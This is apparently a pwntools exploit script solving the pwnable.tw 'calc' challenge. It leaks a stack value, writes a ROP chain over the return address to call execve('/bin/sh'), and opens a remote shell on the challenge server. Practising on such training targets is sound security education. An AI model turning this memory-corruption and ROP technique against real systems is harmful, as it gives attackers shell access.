from pwn import *

p = process("./calc")
print(p.pid)
pause()

"""
execve("/bin/sh",0,0)
BUILD ROPCHAIN

361 --- eax,ret
362 --- 0xb
363 --- ecx,ebx,ret
364 --- 0
365 --- 0
366 --- "/bin/sh\x00"
367 --- int 0x80
368 --- "/bin"
369 --- "/sh\x00"
"""
pop_eax_ret = 0x0805c34b
pop_edx_ecx_ebx_ret=0x080701d0 #pop edx ; pop ecx ; pop ebx ; ret
int_0x80 = 0x08049a21 #int 0x80

def write(addr, index):
    p.sendline("+"+str(361+index))
    raddr = int(p.recvline())
    if addr - raddr > 0:
        p.sendline("+"+str(361+index)+"+"+str(addr - raddr))
        raddr = int(p.recvline())
        log.info("RET: "+hex(raddr))
    else:
        p.sendline("+"+str(361+index)+str(addr - raddr))
        raddr = int(p.recvline())
        log.info("RET: "+hex(raddr))

def pwned(ip,port,debug):
    global p
    if debug == 1:
        context.log_level = 'DEBUG'
        p.process("./calc")
    else:
        p = remote(ip,port)
    p.sendlineafter("=== Welcome to SECPROG calculator ===\n",b"+360")
    leak = int(p.recvline()) & 0xffffffff
    log.info("LEAK: "+hex(leak))
    write(pop_eax_ret,0)
    write(0xb,1)
    write(pop_edx_ecx_ebx_ret,2)
    write(0,3)
    write(0,4)

    p.sendline("+"+str(361+5))
    retaddr  = int(p.recvline())
    log.info("LEAK RET ADDR: "+hex(retaddr))
    p.sendline("+"+str(361+5)+"-"+str(retaddr)+"-"+str(0x100000000-leak)) #note
    retaddr = int(p.recvline())
    log.info("RET: "+hex(retaddr))
    write(int_0x80,6)
    write(u32(b"/bin"),7)
    write(u32(b"/sh\x00"),8)
    p.interactive()
if __name__ == '__main__':
    pwned("chall.pwnable.tw",10100,0)
